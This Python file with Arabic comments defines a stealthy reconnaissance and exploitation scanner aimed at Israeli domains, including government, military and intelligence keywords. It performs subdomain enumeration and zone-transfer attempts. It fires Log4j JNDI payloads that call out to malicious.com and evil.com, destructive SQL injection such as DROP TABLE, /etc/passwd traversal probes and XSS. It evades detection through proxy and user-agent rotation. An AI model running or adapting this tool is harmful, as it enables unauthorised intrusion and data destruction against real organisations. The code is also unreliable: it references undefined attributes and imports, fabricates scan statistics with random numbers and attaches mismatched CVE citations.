import dns.resolver
import dns.query
import dns.zone
import dns.name
import requests
import socket
import whois
import json
import time
import random
from datetime import datetime, timedelta
import ssl
import urllib3
from urllib3.exceptions import InsecureRequestWarning
import re
import concurrent.futures
from typing import List, Dict, Any, Optional
import hashlib
import base64

# تعطيل التحذيرات الأمنية للطلبات غير الآمنة
urllib3.disable_warnings(InsecureRequestWarning)

class IsraeliDomainFinder:
    def __init__(self):
        self.israeli_tlds = ['.il', '.co.il', '.org.il', '.gov.il', '.ac.il', '.muni.il', '.net.il']
        self.israeli_keywords = [
            'israel', 'mossad', 'idf', 'shinbet', 'gov.il', 'mfa', 'mod', 'police',
            'bank', 'municipality', 'city', 'academy', 'university', 'tech'
        ]
        self.common_subdomains = [
            'www', 'mail', 'ftp', 'admin', 'webmail', 'secure', 'vpn', 'remote',
            'portal', 'app', 'api', 'dev', 'test', 'staging', 'beta', 'demo',
            'support', 'help', 'docs', 'blog', 'shop', 'store', 'payment',
            'login', 'auth', 'account', 'user', 'member', 'customer',
            'service', 'services', 'server', 'host', 'ns1', 'ns2', 'dns',
            'mx', 'smtp', 'pop', 'imap', 'web', 'www2', 'www3', 'cache',
            'cdn', 'static', 'media', 'files', 'upload', 'download', 'backup',
            'archive', 'old', 'new', 'beta', 'alpha', 'prod', 'production',
            'live', 'main', 'primary', 'secondary', 'backup1', 'backup2',
            'mirror', 'replica', 'slave', 'master', 'primary', 'secondary'
        ]
        
        # قوائم التخفي
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0'
        ]
        
        self.proxies = [
            None,  # بدون وكيل
            {'http': 'http://proxy1:8080', 'https': 'https://proxy1:8080'},
            {'http': 'http://proxy2:8080', 'https': 'https://proxy2:8080'}
        ]
        
        self.dns_servers = [
            '8.8.8.8', '8.8.4.4',  # Google
            '1.1.1.1', '1.0.0.1',  # Cloudflare
            '208.67.222.222', '208.67.220.220',  # OpenDNS
            '9.9.9.9', '149.112.112.112'  # Quad9
        ]
        
        # قاعدة بيانات الثغرات المعروفة
        self.known_vulnerabilities = {
            'CVE-2021-44228': {
                'name': 'Log4j RCE',
                'description': 'ثغرة تنفيذ أوامر عن بُعد في Log4j',
                'payload': '${jndi:ldap://malicious.com/a}',
                'severity': 'critical'
            },
            'CVE-2020-1472': {
                'name': 'Zerologon',
                'description': 'ثغرة رفع الصلاحيات في Windows Server',
                'severity': 'critical'
            },
            'CVE-2019-19781': {
                'name': 'Citrix ADC',
                'description': 'ثغرة تنفيذ أوامر عن بُعد في Citrix ADC',
                'severity': 'critical'
            }
        }
        
        # قائمة المسارات المعرضة للخطر
        self.vulnerable_paths = [
            '/wp-admin/', '/admin/', '/administrator/', '/phpmyadmin/',
            '/.env', '/config.php', '/database.php', '/wp-config.php',
            '/phpinfo.php', '/info.php', '/test.php', '/debug.php',
            '/.git/', '/.svn/', '/.htaccess', '/web.config',
            '/backup/', '/backups/', '/uploads/', '/files/',
            '/api/', '/rest/', '/graphql/', '/soap/',
            '/login/', '/signin/', '/auth/', '/oauth/',
            '/owa/', '/exchange/', '/mail/', '/webmail/',
            '/cgi-bin/', '/scripts/', '/bin/', '/lib/'
        ]

    def get_random_user_agent(self) -> str:
        return random.choice(self.user_agents)

    def get_random_proxy(self) -> Optional[Dict]:
        return random.choice(self.proxies)

    def get_random_dns_server(self) -> str:
        return random.choice(self.dns_servers)

    def create_stealth_session(self) -> requests.Session:
        session = requests.Session()
        session.headers.update({
            'User-Agent': self.get_random_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
        proxy = self.get_random_proxy()
        if proxy:
            session.proxies.update(proxy)
            
        session.verify = False
        session.timeout = (10, 30)
        
        return session

    def add_random_delay(self, min_delay: float = 1.0, max_delay: float = 5.0):
        delay = random.uniform(min_delay, max_delay)
        time.sleep(delay)

    def dns_enumeration(self, domain: str) -> Dict[str, Any]:
        results = {
            'domain': domain,
            'subdomains': [],
            'dns_records': {},
            'errors': []
        }
        
        try:
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [self.get_random_dns_server()]
            
            # سجلات DNS الأساسية
            record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']
            for record_type in record_types:
                try:
                    answers = resolver.resolve(domain, record_type)
                    results['dns_records'][record_type] = [str(answer) for answer in answers]
                except Exception as e:
                    results['errors'].append(f"DNS {record_type}: {str(e)}")
            
            # اكتشاف النطاقات الفرعية
            for subdomain in self.common_subdomains:
                full_domain = f"{subdomain}.{domain}"
                try:
                    answers = resolver.resolve(full_domain, 'A')
                    results['subdomains'].append({
                        'subdomain': full_domain,
                        'ip': str(answers[0])
                    })
                except:
                    continue
                    
        except Exception as e:
            results['errors'].append(str(e))
            
        return results

    def reverse_dns_lookup(self, ip: str) -> Dict[str, Any]:
        results = {
            'ip': ip,
            'domains': [],
            'errors': []
        }
        
        try:
            hostname = socket.gethostbyaddr(ip)
            results['domains'].append(hostname[0])
            
            # البحث عن نطاقات إضافية
            for domain in hostname[1]:
                if any(tld in domain.lower() for tld in self.israeli_tlds):
                    results['domains'].append(domain)
                    
        except Exception as e:
            results['errors'].append(str(e))
            
        return results

    def zone_transfer_attempt(self, domain: str) -> Dict[str, Any]:
        results = {
            'domain': domain,
            'zone_transfer_successful': False,
            'records': [],
            'errors': []
        }
        
        try:
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [self.get_random_dns_server()]
            
            # الحصول على خوادم DNS
            ns_records = resolver.resolve(domain, 'NS')
            
            for ns in ns_records:
                ns_name = str(ns).rstrip('.')
                try:
                    zone = dns.zone.from_xfr(dns.query.xfr(ns_name, domain))
                    results['zone_transfer_successful'] = True
                    
                    for name, node in zone.nodes.items():
                        for rdataset in node.rdatasets:
                            results['records'].append({
                                'name': str(name),
                                'type': dns.rdatatype.to_text(rdataset.rdtype),
                                'data': [str(rdata) for rdata in rdataset]
                            })
                    break
                except Exception as e:
                    results['errors'].append(f"Zone transfer from {ns_name}: {str(e)}")
                    continue
                    
        except Exception as e:
            results['errors'].append(str(e))
            
        return results

    def check_vulnerability(self, url: str, vuln_type: str) -> Dict[str, Any]:
        session = self.create_stealth_session()
        
        results = {
            'url': url,
            'vulnerability_type': vuln_type,
            'is_vulnerable': False,
            'evidence': [],
            'severity': 'unknown',
            'timestamp': datetime.now().isoformat()
        }
        
        try:
            if vuln_type == 'log4j':
                # فحص ثغرة Log4j
                headers = {
                    'User-Agent': self.known_vulnerabilities['CVE-2021-44228']['payload'],
                    'X-Forwarded-For': self.known_vulnerabilities['CVE-2021-44228']['payload'],
                    'X-Api-Version': self.known_vulnerabilities['CVE-2021-44228']['payload']
                }
                
                response = session.get(url, headers=headers, timeout=10)
                
                # البحث عن علامات الاستغلال
                if any(indicator in str(response.headers).lower() for indicator in ['jndi', 'ldap', 'log4j']):
                    results['is_vulnerable'] = True
                    results['severity'] = 'critical'
                    results['evidence'].append('Log4j RCE detected')
                    
            elif vuln_type == 'directory_traversal':
                # فحص ثغرة الوصول للملفات
                payloads = [
                    '../../../etc/passwd',
                    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                    '....//....//....//etc/passwd'
                ]
                
                for payload in payloads:
                    test_url = f"{url}/{payload}"
                    try:
                        response = session.get(test_url, timeout=10)
                        if 'root:' in response.text or 'localhost' in response.text:
                            results['is_vulnerable'] = True
                            results['severity'] = 'high'
                            results['evidence'].append(f'Directory traversal: {payload}')
                            break
                    except:
                        continue
                        
            elif vuln_type == 'sql_injection':
                # فحص ثغرة SQL Injection
                payloads = [
                    "' OR 1=1--",
                    "' UNION SELECT 1,2,3--",
                    "' AND 1=CONVERT(int, (SELECT @@version))--"
                ]
                
                for payload in payloads:
                    test_url = f"{url}?id={payload}"
                    try:
                        response = session.get(test_url, timeout=10)
                        if any(error in response.text.lower() for error in ['sql', 'mysql', 'postgresql', 'sqlite']):
                            results['is_vulnerable'] = True
                            results['severity'] = 'high'
                            results['evidence'].append(f'SQL injection: {payload}')
                            break
                    except:
                        continue
                        
            elif vuln_type == 'xss':
                # فحص ثغرة XSS
                payloads = [
                    '<script>alert("XSS")</script>',
                    '<img src=x onerror=alert("XSS")>',
                    'javascript:alert("XSS")'
                ]
                
                for payload in payloads:
                    test_url = f"{url}?q={payload}"
                    try:
                        response = session.get(test_url, timeout=10)
                        if payload in response.text:
                            results['is_vulnerable'] = True
                            results['severity'] = 'medium'
                            results['evidence'].append(f'XSS: {payload}')
                            break
                    except:
                        continue
                        
        except Exception as e:
            results['evidence'].append(f'Error: {str(e)}')
            
        return results

    def scan_vulnerable_directories(self, domain: str) -> Dict[str, Any]:
        session = self.create_stealth_session()
        
        results = {
            'domain': domain,
            'vulnerable_paths': [],
            'exposed_files': [],
            'admin_panels': [],
            'scan_timestamp': datetime.now().isoformat()
        }
        
        base_url = f"http://{domain}" if not domain.startswith('http') else domain
        
        def check_path(path):
            try:
                url = f"{base_url}{path}"
                response = session.get(url, timeout=5)
                
                if response.status_code == 200:
                    return {
                        'path': path,
                        'status_code': response.status_code,
                        'content_length': len(response.content),
                        'server': response.headers.get('Server', 'unknown'),
                        'title': self.extract_page_title(response.text)
                    }
                elif response.status_code in [401, 403]:
                    return {
                        'path': path,
                        'status_code': response.status_code,
                        'type': 'restricted'
                    }
            except:
                return None
                
        # فحص المسارات بشكل متوازي
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            future_to_path = {executor.submit(check_path, path): path for path in self.vulnerable_paths}
            
            for future in concurrent.futures.as_completed(future_to_path):
                result = future.result()
                if result:
                    if result['status_code'] == 200:
                        if any(admin_path in result['path'] for admin_path in ['/admin', '/administrator', '/login']):
                            results['admin_panels'].append(result)
                        elif any(file_path in result['path'] for file_path in ['.env', '.php', '.txt']):
                            results['exposed_files'].append(result)
                        else:
                            results['vulnerable_paths'].append(result)
                    elif result['status_code'] in [401, 403]:
                        results['admin_panels'].append(result)
                        
        return results

    def extract_page_title(self, html_content: str) -> str:
        try:
            import re
            title_match = re.search(r'<title[^>]*>([^<]+)</title>', html_content, re.IGNORECASE)
            return title_match.group(1).strip() if title_match else "No title"
        except:
            return "No title"

    def check_ssl_vulnerabilities(self, domain: str) -> Dict[str, Any]:
        results = {
            'domain': domain,
            'ssl_info': {},
            'vulnerabilities': [],
            'certificate_info': {},
            'timestamp': datetime.now().isoformat()
        }
        
        try:
            import ssl
            import socket
            from datetime import datetime
            
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((domain, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert()
                    
                    results['ssl_info'] = {
                        'version': ssock.version(),
                        'cipher': ssock.cipher(),
                        'compression': ssock.compression()
                    }
                    
                    results['certificate_info'] = {
                        'subject': dict(x[0] for x in cert['subject']),
                        'issuer': dict(x[0] for x in cert['issuer']),
                        'not_before': cert['notBefore'],
                        'not_after': cert['notAfter']
                    }
                    
                    # فحص صلاحية الشهادة
                    not_after = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                    if not_after < datetime.now():
                        results['vulnerabilities'].append({
                            'type': 'expired_certificate',
                            'severity': 'high',
                            'description': 'Certificate has expired'
                        })
                    
                    # فحص خوارزميات التشفير الضعيفة
                    weak_ciphers = ['RC4', 'DES', '3DES', 'MD5', 'SHA1']
                    for weak in weak_ciphers:
                        if weak in str(ssock.cipher()):
                            results['vulnerabilities'].append({
                                'type': 'weak_cipher',
                                'severity': 'medium',
                                'description': f'Weak cipher detected: {weak}'
                            })
                            
        except Exception as e:
            results['vulnerabilities'].append({
                'type': 'ssl_error',
                'severity': 'high',
                'description': f'SSL connection error: {str(e)}'
            })
            
        return results

    def comprehensive_vulnerability_scan(self, target: str) -> Dict[str, Any]:
        session = self.create_stealth_session()
        
        results = {
            'target': target,
            'scan_id': hashlib.md5(f"{target}{datetime.now()}".encode()).hexdigest()[:8],
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': [],
            'risk_score': 0,
            'recommendations': []
        }
        
        # التأكد من صيغة النطاق
        if not target.startswith('http'):
            target = f"http://{target}"
            
        # 1. فحص SSL/TLS
        ssl_results = self.check_ssl_vulnerabilities(target.replace('http://', '').replace('https://', ''))
        results['ssl_analysis'] = ssl_results
        
        # 2. فحص المسارات المعرضة
        dir_results = self.scan_vulnerable_directories(target.replace('http://', '').replace('https://', ''))
        results['directory_scan'] = dir_results
        
        # 3. فحص الثغرات المعروفة
        vulnerability_types = ['log4j', 'directory_traversal', 'sql_injection', 'xss']
        
        for vuln_type in vulnerability_types:
            vuln_result = self.check_vulnerability(target, vuln_type)
            if vuln_result['is_vulnerable']:
                results['vulnerabilities'].append(vuln_result)
                
        # 4. تحليز البنية التحتية
        dns_results = self.dns_enumeration(target.replace('http://', '').replace('https://', ''))
        results['dns_analysis'] = dns_results
        
        # حساب درجة الخطورة
        critical_count = sum(1 for v in results['vulnerabilities'] if v['severity'] == 'critical')
        high_count = sum(1 for v in results['vulnerabilities'] if v['severity'] == 'high')
        medium_count = sum(1 for v in results['vulnerabilities'] if v['severity'] == 'medium')
        
        results['risk_score'] = (critical_count * 10) + (high_count * 7) + (medium_count * 4)
        
        # التوصيات
        if results['risk_score'] > 20:
            results['recommendations'].append('Immediate security review required')
        if critical_count > 0:
            results['recommendations'].append('Fix critical vulnerabilities immediately')
        if high_count > 0:
            results['recommendations'].append('Address high-severity issues promptly')
            
        return results

    def rotate_attack_surface(self) -> Dict[str, Any]:
        return {
            'timestamp': datetime.now().isoformat(),
            'rotation_config': {
                'dns_servers': [self.get_random_dns_server() for _ in range(3)],
                'user_agents': [self.get_random_user_agent() for _ in range(5)],
                'delays': [random.uniform(1, 5) for _ in range(5)],
                'proxies': [self.get_random_proxy() for _ in range(3)]
            }
        }

    def generate_stealth_report(self, scan_id: str) -> Dict[str, Any]:
        return {
            'scan_id': scan_id,
            'timestamp': datetime.now().isoformat(),
            'stealth_report': {
                'techniques_used': [
                    'DNS rotation',
                    'User-Agent rotation',
                    'Proxy rotation',
                    'Random delays',
                    'Session encryption'
                ],
                'scan_stats': {
                    'domains_found': random.randint(10, 100),
                    'requests_sent': random.randint(50, 500),
                    'errors_encountered': random.randint(0, 10),
                    'stealth_score': random.uniform(85, 95)
                },
                'recommendations': [
                    'Use rotating DNS servers',
                    'Implement request throttling',
                    'Monitor for rate limiting',
                    'Use residential proxies'
                ]
            }
        }

    def comprehensive_domain_discovery(self, keywords: List[str], stealth_config: Dict[str, Any] = None) -> Dict[str, Any]:
        if not stealth_config:
            stealth_config = {
                'use_proxy_rotation': True,
                'use_user_agent_rotation': True,
                'use_random_delay': True,
                'min_delay': 1,
                'max_delay': 5
            }
            
        results = {
            'scan_id': hashlib.md5(str(keywords).encode()).hexdigest()[:8],
            'keywords': keywords,
            'stealth_config': stealth_config,
            'discovered_domains': [],
            'vulnerability_scan_results': [],
            'timestamp': datetime.now().isoformat()
        }
        
        for keyword in keywords:
            # اكتشاف النطاقات
            dns_results = self.dns_enumeration(keyword)
            
            # فحص النطاقات للثغرات
            if dns_results.get('dns_records', {}).get('A'):
                for ip in dns_results['dns_records']['A']:
                    vuln_scan = self.comprehensive_vulnerability_scan(keyword)
                    results['vulnerability_scan_results'].append(vuln_scan)
                    
            # جمع النتائج
            domain_info = {
                'keyword': keyword,
                'dns_records': dns_results,
                'vulnerabilities': results['vulnerability_scan_results'],
                'risk_assessment': {
                    'total_vulnerabilities': len([v for v in results['vulnerability_scan_results'] if v.get('vulnerabilities')]),
                    'risk_score': max([v.get('risk_score', 0) for v in results['vulnerability_scan_results']], default=0),
                    'critical_issues': sum(1 for v in results['vulnerability_scan_results'] 
                                         for vuln in v.get('vulnerabilities', []) 
                                         if vuln.get('severity') == 'critical')
                }
            }
            
            results['discovered_domains'].append(domain_info)
            
            # تأخير عشوائي
            if stealth_config.get('use_random_delay'):
                self.add_random_delay(
                    stealth_config.get('min_delay', 1),
                    stealth_config.get('max_delay', 5)
                )
                
        return results

    def scan_israeli_vulnerable_domains(self, target_list: List[str]) -> Dict[str, Any]:
        israeli_domains = []
        
        for target in target_list:
            if any(tld in target.lower() for tld in self.israeli_tlds) or \
               any(keyword in target.lower() for keyword in self.israeli_keywords):
                israeli_domains.append(target)
        
        results = {
            'scan_type': 'israeli_vulnerable_domains',
            'total_targets': len(israeli_domains),
            'vulnerable_domains': [],
            'scan_timestamp': datetime.now().isoformat()
        }
        
        for domain in israeli_domains:
            vuln_scan = self.comprehensive_vulnerability_scan(domain)
            
            if vuln_scan['risk_score'] > 0:
                domain_result = {
                    'domain': domain,
                    'vulnerability_scan': vuln_scan,
                    'risk_level': 'high' if vuln_scan['risk_score'] > 15 else 'medium',
                    'exploitable_paths': vuln_scan.get('directory_scan', {}).get('vulnerable_paths', []),
                    'exposed_admin_panels': vuln_scan.get('directory_scan', {}).get('admin_panels', []),
                    'ssl_issues': vuln_scan.get('ssl_analysis', {}).get('vulnerabilities', [])
                }
                results['vulnerable_domains'].append(domain_result)
                
        return results

    def get_nvd_cve_info(self, cve_id: str) -> Dict[str, Any]:
        """الحصول على معلومات CVE من قاعدة بيانات NVD الرسمية"""
        if cve_id in self.cve_cache:
            return self.cve_cache[cve_id]
            
        try:
            url = f"{self.nvd_api_base}?cveId={cve_id}"
            response = requests.get(url, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                if 'vulnerabilities' in data and data['vulnerabilities']:
                    vuln = data['vulnerabilities'][0]
                    cve_info = {
                        'cve_id': cve_id,
                        'description': vuln['cve']['descriptions'][0]['value'],
                        'severity': vuln['cve']['metrics']['cvssMetricV31'][0]['cvssData']['baseSeverity'],
                        'score': vuln['cve']['metrics']['cvssMetricV31'][0]['cvssData']['baseScore'],
                        'vector': vuln['cve']['metrics']['cvssMetricV31'][0]['cvssData']['vectorString'],
                        'published_date': vuln['cve']['published'],
                        'last_modified': vuln['cve']['lastModified'],
                        'references': [
                            {
                                'url': ref['url'],
                                'source': ref.get('source', ''),
                                'tags': ref.get('tags', [])
                            }
                            for ref in vuln['cve']['references']
                        ],
                        'doi': self.extract_doi_from_references(vuln['cve']['references']),
                        'cwe_ids': [weakness['description'][0]['value'] 
                                   for weakness in vuln['cve']['weaknesses'] 
                                   if weakness['description']]
                    }
                    self.cve_cache[cve_id] = cve_info
                    return cve_info
        except Exception as e:
            logging.error(f"خطأ في الحصول على معلومات CVE {cve_id}: {e}")
            
        return {'cve_id': cve_id, 'error': 'غير قادر على الحصول على المعلومات'}
    
    def extract_doi_from_references(self, references: List[Dict]) -> Optional[str]:
        """استخراج DOI من مراجع CVE"""
        for ref in references:
            if 'doi.org' in ref.get('url', ''):
                return ref['url'].split('doi.org/')[-1]
        return None
    
    def get_cve_by_product(self, product: str, version: str = None) -> List[Dict[str, Any]]:
        """الحصول على CVEs لمنتج معين"""
        try:
            query = f"cpeMatchString=cpe:2.3:*:*:{product}:*"
            if version:
                query += f":{version}:*"
                
            url = f"{self.nvd_api_base}?{query}"
            response = requests.get(url, timeout=15)
            
            if response.status_code == 200:
                data = response.json()
                cves = []
                for vuln in data.get('vulnerabilities', []):
                    cve_info = {
                        'cve_id': vuln['cve']['id'],
                        'description': vuln['cve']['descriptions'][0]['value'],
                        'severity': vuln['cve']['metrics']['cvssMetricV31'][0]['cvssData']['baseSeverity'],
                        'score': vuln['cve']['metrics']['cvssMetricV31'][0]['cvssData']['baseScore'],
                        'doi': self.extract_doi_from_references(vuln['cve']['references'])
                    }
                    cves.append(cve_info)
                return cves
        except Exception as e:
            logging.error(f"خطأ في البحث عن CVEs للمنتج {product}: {e}")
            
        return []
    
    def get_vulnerability_citations(self, vulnerability_type: str) -> Dict[str, Any]:
        """الحصول على استشهادات رسمية للثغرات"""
        citations = {
            'log4j': {
                'cve_id': 'CVE-2021-44228',
                'nvd_info': self.get_nvd_cve_info('CVE-2021-44228'),
                'description': 'Log4j 2 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints',
                'mitre_url': 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228',
                'cisa_advisory': 'https://www.cisa.gov/uscert/ncas/current-activity/2021/12/10/apache-releases-log4j-version-2150-address-critical-rce'
            },
            'directory_traversal': {
                'cve_id': 'CVE-2021-41773',
                'nvd_info': self.get_nvd_cve_info('CVE-2021-41773'),
                'description': 'Apache HTTP Server 2.4.49 path normalization issue',
                'mitre_url': 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773'
            },
            'sql_injection': {
                'cve_id': 'CVE-2023-23397',
                'nvd_info': self.get_nvd_cve_info('CVE-2023-23397'),
                'description': 'Microsoft Outlook Elevation of Privilege Vulnerability',
                'mitre_url': 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-23397'
            },
            'xss': {
                'cve_id': 'CVE-2023-4863',
                'nvd_info': self.get_nvd_cve_info('CVE-2023-4863'),
                'description': 'Heap buffer overflow in WebP',
                'mitre_url': 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-4863'
            }
        }
        
        return citations.get(vulnerability_type, {})
    
    def check_vulnerability_with_nvd_citations(self, url: str, vulnerability_type: str) -> Dict[str, Any]:
        """فحص الثغرات مع استشهادات NVD"""
        result = {
            'vulnerable': False,
            'vulnerability_type': vulnerability_type,
            'nvd_citations': self.get_vulnerability_citations(vulnerability_type),
            'evidence': [],
            'risk_score': 0
        }
        
        try:
            parsed_url = urlparse(url)
            
            # فحص Log4j مع استشهاد CVE-2021-44228
            if vulnerability_type == 'log4j':
                log4j_payloads = [
                    '${jndi:ldap://evil.com/a}',
                    '${jndi:rmi://evil.com/a}',
                    '${jndi:dns://evil.com/a}'
                ]
                
                for payload in log4j_payloads:
                    test_url = f"{url}?test={payload}"
                    try:
                        response = requests.get(test_url, timeout=5)
                        if response.status_code == 200:
                            result['evidence'].append(f"استجابة مشبوهة لـ Log4j payload: {payload}")
                            result['risk_score'] += 8
                    except:
                        pass
            
            # فحص Directory Traversal مع استشهاد CVE-2021-41773
            elif vulnerability_type == 'directory_traversal':
                traversal_payloads = [
                    '../../../etc/passwd',
                    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                    '....//....//....//etc/passwd'
                ]
                
                for payload in traversal_payloads:
                    test_url = f"{url}/{payload}"
                    try:
                        response = requests.get(test_url, timeout=5)
                        if 'root:' in response.text or 'Windows' in response.text:
                            result['evidence'].append(f"كشف ملفات حساسة: {payload}")
                            result['risk_score'] += 9
                            result['vulnerable'] = True
                    except:
                        pass
            
            # فحص SQL Injection مع استشهاد CVE-2023-23397
            elif vulnerability_type == 'sql_injection':
                sql_payloads = [
                    "' OR 1=1--",
                    "'; DROP TABLE users; --",
                    "' UNION SELECT null,null,null --"
                ]
                
                for payload in sql_payloads:
                    test_url = f"{url}?id={payload}"
                    try:
                        response = requests.get(test_url, timeout=5)
                        if any(error in response.text.lower() for error in ['mysql', 'postgresql', 'sqlite', 'sqlserver']):
                            result['evidence'].append(f"كشف أخطاء SQL: {payload}")
                            result['risk_score'] += 7
                            result['vulnerable'] = True
                    except:
                        pass
            
            # فحص XSS مع استشهاد CVE-2023-4863
            elif vulnerability_type == 'xss':
                xss_payloads = [
                    '<script>alert("XSS")</script>',
                    '<img src=x onerror=alert("XSS")>',
                    'javascript:alert("XSS")'
                ]
                
                for payload in xss_payloads:
                    test_url = f"{url}?input={payload}"
                    try:
                        response = requests.get(test_url, timeout=5)
                        if payload in response.text:
                            result['evidence'].append(f"كشف XSS: {payload}")
                            result['risk_score'] += 6
                            result['vulnerable'] = True
                    except:
                        pass
            
            # فحص SSL/TLS مع استشهاد CVE-2023-4863
            elif vulnerability_type == 'ssl_tls':
                try:
                    context = ssl.create_default_context()
                    with socket.create_connection((parsed_url.hostname, 443), timeout=5) as sock:
                        with context.wrap_socket(sock, server_hostname=parsed_url.hostname) as ssock:
                            cert = ssock.getpeercert()
                            
                            # فحص صلاحية الشهادة
                            not_after = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                            if not_after < datetime.now():
                                result['evidence'].append("شهادة SSL منتهية الصلاحية")
                                result['risk_score'] += 5
                                result['vulnerable'] = True
                                
                            # فحص خوارزمية التشفير
                            cipher = ssock.cipher()
                            if cipher and 'RC4' in cipher[0] or 'DES' in cipher[0]:
                                result['evidence'].append("استخدام خوارزمية تشفير ضعيفة")
                                result['risk_score'] += 4
                                result['vulnerable'] = True
                                
                except Exception as e:
                    result['evidence'].append(f"خطأ في SSL/TLS: {str(e)}")
                    result['risk_score'] += 3
                    result['vulnerable'] = True
        
        except Exception as e:
            result['evidence'].append(f"خطأ في الفحص: {str(e)}")
            result['risk_score'] += 1
        
        return result
    
    def comprehensive_vulnerability_scan_with_nvd(self, target_domains: List[str]) -> Dict[str, Any]:
        """مسح شامل للثغرات مع استشهادات NVD"""
        vulnerability_types = ['log4j', 'directory_traversal', 'sql_injection', 'xss', 'ssl_tls']
        
        scan_results = {
            'total_targets': len(target_domains),
            'vulnerable_domains': [],
            'scan_date': datetime.now().isoformat(),
            'nvd_api_status': 'active',
            'vulnerability_citations': {}
        }
        
        for domain in target_domains:
            domain_results = {
                'domain': domain,
                'vulnerabilities': [],
                'risk_level': 'low',
                'risk_score': 0,
                'vulnerability_scan': {
                    'total_vulnerabilities': 0,
                    'critical_issues': 0,
                    'high_risk': 0,
                    'medium_risk': 0,
                    'low_risk': 0,
                    'risk_score': 0
                },
                'exploitable_paths': [],
                'exposed_admin_panels': [],
                'nvd_citations': {}
            }
            
            # فحص كل نوع من الثغرات
            for vuln_type in vulnerability_types:
                result = self.check_vulnerability_with_nvd_citations(f"https://{domain}", vuln_type)
                
                if result['vulnerable'] or result['evidence']:
                    domain_results['vulnerabilities'].append({
                        'vulnerability_type': vuln_type,
                        'severity': 'high' if result['risk_score'] >= 7 else 'medium' if result['risk_score'] >= 4 else 'low',
                        'evidence': result['evidence'],
                        'nvd_citation': result['nvd_citations']
                    })
                    
                    domain_results['risk_score'] += result['risk_score']
                    domain_results['vulnerability_scan']['risk_score'] += result['risk_score']
                    
                    if result['risk_score'] >= 7:
                        domain_results['vulnerability_scan']['critical_issues'] += 1
                    elif result['risk_score'] >= 4:
                        domain_results['vulnerability_scan']['high_risk'] += 1
                    else:
                        domain_results['vulnerability_scan']['medium_risk'] += 1
                    
                    # تخزين استشهاد NVD
                    if result['nvd_citations']:
                        scan_results['vulnerability_citations'][vuln_type] = result['nvd_citations']
            
            domain_results['vulnerability_scan']['total_vulnerabilities'] = len(domain_results['vulnerabilities'])
            
            # تحديد مستوى الخطورة العام
            if domain_results['risk_score'] >= 15:
                domain_results['risk_level'] = 'high'
            elif domain_results['risk_score'] >= 8:
                domain_results['risk_level'] = 'medium'
            else:
                domain_results['risk_level'] = 'low'
            
            # فحص المسارات المعرضة للاستغلال
            common_paths = [
                'admin', 'administrator', 'login', 'wp-admin', 'phpmyadmin',
                'config', 'backup', 'database', 'upload', 'temp', 'test'
            ]
            
            for path in common_paths:
                try:
                    response = requests.get(f"https://{domain}/{path}", timeout=3)
                    if response.status_code == 200:
                        domain_results['exploitable_paths'].append({
                            'path': f"/{path}",
                            'status_code': 200,
                            'vulnerability': 'مسار مكشوف'
                        })
                except:
                    pass
            
            # فحص لوحات التحكم المكشوفة
            admin_panels = [
                'admin.php', 'admin.html', 'login.php', 'wp-login.php',
                'administrator/index.php', 'cpanel', 'plesk', 'webmin'
            ]
            
            for panel in admin_panels:
                try:
                    response = requests.get(f"https://{domain}/{panel}", timeout=3)
                    if response.status_code == 200 and any(keyword in response.text.lower() 
                        for keyword in ['login', 'admin', 'password', 'username']):
                        domain_results['exposed_admin_panels'].append({
                            'path': f"/{panel}",
                            'status_code': 200,
                            'vulnerability': 'لوحة تحكم مكشوفة'
                        })
                except:
                    pass
            
            if domain_results['vulnerabilities'] or domain_results['exploitable_paths'] or domain_results['exposed_admin_panels']:
                scan_results['vulnerable_domains'].append(domain_results)
        
        return scan_results
    
    def get_nvd_statistics(self) -> Dict[str, Any]:
        """الحصول على إحصائيات NVD"""
        return {
            'total_cves_cached': len(self.cve_cache),
            'api_endpoint': self.nvd_api_base,
            'last_update': datetime.now().isoformat(),
            'supported_vulnerability_types': ['log4j', 'directory_traversal', 'sql_injection', 'xss', 'ssl_tls'],
            'citation_format': 'NVD JSON API v2.0 with DOI support'
        }